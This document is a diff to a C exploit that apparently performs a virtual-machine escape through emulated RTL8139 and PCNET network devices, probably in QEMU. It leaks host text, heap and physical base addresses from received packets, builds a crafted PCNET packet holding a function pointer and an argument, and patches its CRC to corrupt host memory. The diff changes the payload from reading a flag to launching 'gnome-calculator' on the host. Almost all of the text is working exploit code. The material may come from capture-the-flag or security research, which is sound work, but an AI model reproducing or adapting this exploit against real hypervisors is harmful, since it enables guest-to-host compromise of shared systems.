@@ -244,8 +244,8 @@ struct pcnet_desc {
 };
 
 static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = {
-	0x52, 0x54, 0x00, 0x12, 0x34, 0x58, 0x52,
-	0x54, 0x00, 0x12, 0x34, 0x58, 0x08, 0x00,
+	0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52,
+	0x54, 0x00, 0x12, 0x34, 0x57, 0x08, 0x00,
 };
 
 hptr_t phy_mem = 0;
@@ -603,6 +603,8 @@ void pcnet_packet_send(struct pcnet_desc *desc, void *buffer,
 	}
 }
 
+#define BUFFER_OFFSET 0xffffffff
+
 int main()
 {
 	struct rtl8139_ring *rtl8139_rx_ring;
@@ -655,8 +657,8 @@ int main()
 	uint64_t textBaseAddr = 0;
 	uint64_t phyBaseAddr = 0;
 	uint64_t heapBaseAddr = 0;
-	//for (i = 0; i < rtl8139_rx_nb; i++)
-	//	xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
+	for (i = 0; i < rtl8139_rx_nb; i++)
+		xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
 	for (i = 0; i < rtl8139_rx_nb; i++)
 	{
 		textBaseAddr = searchTextBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
@@ -711,11 +713,13 @@ int main()
 	printf("[+] Start to pwn\n");
 	
 	packet_ptr = pcnet_packet;
-	for(int j=0x10; j<0x1f8; j += 4){
-		*(packet_ptr + j) = textBaseAddr + 0xa8a00;
-		*(packet_ptr + j + 1) = heapBaseAddr + 0x12889b0;
-		*(packet_ptr + j + 2) = 0x67616c6620746163;//0x736c; //"ls"
-		*(packet_ptr + j + 3) = 0;
+	char* str = malloc(0x10);
+	strcpy(str, "gnome-calculator");
+	packet_ptr = pcnet_packet;
+	for(int j=0x10; j<0x1f8; j += 3)
+	{
+		*(packet_ptr + j) = textBaseAddr+0x9e3b0;
+		*(packet_ptr + j + 1) = phyBaseAddr + gva_to_gpa(str);
 	}
 
 	addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);
@@ -738,7 +742,7 @@ int main()
 	while (ptr != &pcnet_packet[PCNET_BUFFER_SIZE - 4])
 		CRC(fcs, *ptr++);
 	
-	targetValue = (heapBaseAddr + 0x1289120 - 0x30) & 0xffffffff;
+	targetValue = (heapBaseAddr + BUFFER_OFFSET +0x80 - 0x30) & 0xffffffff;
 	
 	pcnet_packet_patch_crc(ptr, fcs, htonl((uint32_t)targetValue));
 	
